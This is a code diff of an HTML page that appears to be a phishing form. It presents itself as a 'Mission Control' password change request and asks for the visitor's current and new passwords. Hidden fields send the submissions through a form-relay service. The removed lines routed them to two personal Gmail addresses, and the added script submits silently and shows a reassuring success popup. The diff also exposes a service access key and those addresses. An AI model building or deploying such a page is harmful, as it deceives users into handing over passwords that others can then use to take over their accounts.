@@ -35,22 +35,20 @@
         <input type="hidden" name="access_key" value="ce3a36e5-fbb8-4008-9d70-f5ad1faff978">
         <input type="hidden" name="from_name" value="Mission Control">
         <input type="hidden" name="subject" value="Password Change Request">
-
-        <!-- Multiple Emails: এখানে আপনার দুইটি ইমেইল বসান -->
-        <input type="hidden" name="emails" value="arafatthewriter@gmail.com,khsumon89@gmail.com">
+        <input type="hidden" name="redirect" value="https://www.youtube.com">
 
         <div class="input-box">
-          <input type="text" id="currentPassword" name="currentPassword" required>
+          <input type="password" id="currentPassword" name="currentPassword" required>
           <label>Current password</label>
         </div>
 
         <div class="input-box">
-          <input type="text" id="newPassword" name="newPassword" required>
+          <input type="password" id="newPassword" name="newPassword" required>
           <label>New password</label>
         </div>
 
         <div class="input-box">
-          <input type="text" id="retypePassword" name="retypePassword" required>
+          <input type="password" id="retypePassword" name="retypePassword" required>
           <label>Retype new password</label>
         </div>
 
@@ -91,5 +89,46 @@
       });
     }
 
-    // Submit Form
+    // SweetAlert Success after submit
+    document.getElementById("changePasswordForm").addEventListener("submit", function (e) {
+      e.preventDefault(); // সরাসরি সাবমিট ঠেকানো
 
+      let form = this;
+      let formData = new FormData(form);
+
+      fetch(form.action, {
+        method: form.method,
+        body: formData
+      })
+        .then(response => response.json())
+        .then(result => {
+          if (result.success) {
+            Swal.fire({
+              title: "Success!",
+              text: "Your password change request has been sent successfully.",
+              icon: "success",
+              confirmButtonText: "OK"
+            });
+            form.reset();
+          } else {
+            Swal.fire({
+              title: "Error!",
+              text: "Something went wrong. Please try again.",
+              icon: "error",
+              confirmButtonText: "OK"
+            });
+          }
+        })
+        .catch(error => {
+          Swal.fire({
+            title: "Error!",
+            text: "Unable to send request.",
+            icon: "error",
+            confirmButtonText: "OK"
+          });
+        });
+    });
+  </script>
+
+</body>
+</html>
